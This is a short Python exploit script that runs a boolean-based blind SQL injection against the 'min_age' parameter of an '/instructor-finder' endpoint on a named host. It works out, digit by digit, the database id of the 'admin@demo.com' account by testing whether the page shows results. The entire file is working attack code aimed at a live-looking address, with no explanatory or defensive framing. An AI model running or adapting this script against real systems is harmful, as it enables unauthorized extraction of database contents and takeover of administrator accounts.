import requests
import re

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
VULN_ENDPOINT = f"{BASE_URL}/instructor-finder"

def check(payload):
    params = {
        'min_age': payload,
        'max_age': '100'
    }
    r = requests.get(VULN_ENDPOINT, params=params)
    # Correct detection: search results should be > 0
    return "No results found" not in r.text

def get_admin_id():
    print("[*] Finding admin user ID...")
    id_str = ""
    # Try to find the length first
    length = 0
    for l in range(1, 10):
        payload = f"1) AND (SELECT LENGTH(id) FROM users WHERE email='admin@demo.com')={l} AND (1=1"
        if check(payload):
            length = l
            print(f"[+] ID Length: {length}")
            break
            
    if length == 0:
        print("[-] Could not determine ID length.")
        return None

    for i in range(1, length + 1):
        for char in "0123456789":
            payload = f"1) AND (SELECT SUBSTRING(id,{i},1) FROM users WHERE email='admin@demo.com')='{char}' AND (1=1"
            if check(payload):
                id_str += char
                print(f"[+] Current ID: {id_str}")
                break
    
    print(f"[+] Final Admin ID: {id_str}")
    return id_str

admin_id = get_admin_id()
